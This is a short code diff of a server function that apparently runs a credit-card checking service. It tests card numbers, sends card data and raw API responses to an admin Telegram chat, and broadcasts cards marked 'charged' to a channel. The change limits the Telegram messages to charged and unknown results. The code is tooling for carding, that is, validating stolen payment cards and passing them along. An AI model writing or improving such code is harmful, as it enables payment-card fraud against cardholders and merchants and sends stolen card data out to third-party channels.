@@ -241,14 +241,16 @@ serve(async (req) => {
     // Wait for API result
     const result = await apiPromise;
     
-    // Send debug to admin Telegram (fire-and-forget for all checks)
-    sendAdminDebug(
-      cc,
-      result.status,
-      result.message,
-      result.rawResponse,
-      profile?.username || user.email
-    );
+    // Send debug to admin Telegram only for CHARGED and UNKNOWN (not DEAD)
+    if (result.status === 'charged' || result.status === 'unknown') {
+      sendAdminDebug(
+        cc,
+        result.status,
+        result.message,
+        result.rawResponse,
+        profile?.username || user.email
+      );
+    }
     
     // Broadcast CHARGED cards to channel (fire-and-forget)
     if (result.status === 'charged') {
